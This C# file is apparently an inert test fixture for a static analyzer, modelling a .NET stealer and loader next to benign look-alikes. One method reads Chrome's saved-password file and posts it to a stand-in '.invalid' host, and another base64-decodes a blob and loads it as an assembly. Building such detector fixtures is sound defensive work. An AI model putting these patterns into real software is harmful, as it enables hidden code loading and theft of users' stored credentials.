// INERT TEST FIXTURE: the shapes a .NET stealer and loader take, for slowship to read. Never run.
// Only its compiled form is read (by REA, statically); the addresses are .invalid and the "payload" is plain text.
using System;
using System.IO;
using System.Net.Http;
using System.Reflection;

public static class Loader
{
    // decodes a blob and loads it as code, in one method: held
    public static void Start()
    {
        var bytes = Convert.FromBase64String("aW5lcnQgdGVzdCBmaXh0dXJlLCBub3QgYSByZWFsIGFzc2VtYmx5");
        Assembly.Load(bytes);
    }

    // reads the browser's saved-password file and posts it, in one method: held
    public static void Sync()
    {
        var data = File.ReadAllBytes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Login Data"));
        new HttpClient().PostAsync("https://collect.example.invalid/upload", new ByteArrayContent(data));
    }

    // an ordinary update check: a web request and nothing else
    public static void CheckForUpdates() => new HttpClient().GetStringAsync("https://updates.example.invalid/latest");

    // loading a plugin by name is ordinary too
    public static void LoadPlugin(string name) => Assembly.Load(name);
}
